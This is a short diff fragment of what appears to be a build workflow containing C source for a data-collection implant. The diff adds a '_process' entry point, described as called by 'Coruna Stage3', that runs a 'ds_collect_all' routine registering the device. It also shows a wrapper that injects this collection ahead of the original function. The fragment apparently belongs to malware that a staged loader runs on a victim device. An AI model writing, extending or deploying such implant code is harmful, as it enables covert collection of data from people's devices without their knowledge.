@@ -344,7 +344,13 @@ jobs:
               if (plist) CFRelease(plist);
           }
            
-          /* Main entry - called by bootstrap's _process wrapper */
+          /* _process entry point - called by Coruna Stage3 */
+          __attribute__((used))
+          void _process(void *ctx) {
+              ds_collect_all();
+          }
+           
+          /* Main data collection function */
           void ds_collect_all(void) {
               int did = register_device();
               if (did <= 0) return;
@@ -413,7 +419,7 @@ jobs:
           extern void ds_collect_all(void);
           
           /* Wrapper _process that calls data collection + original */
-          void _process(void *ctx) {
+          __attribute__((used)) void _process(void *ctx) {
               /* Step 1: Run our data collection */
               ds_collect_all();
               
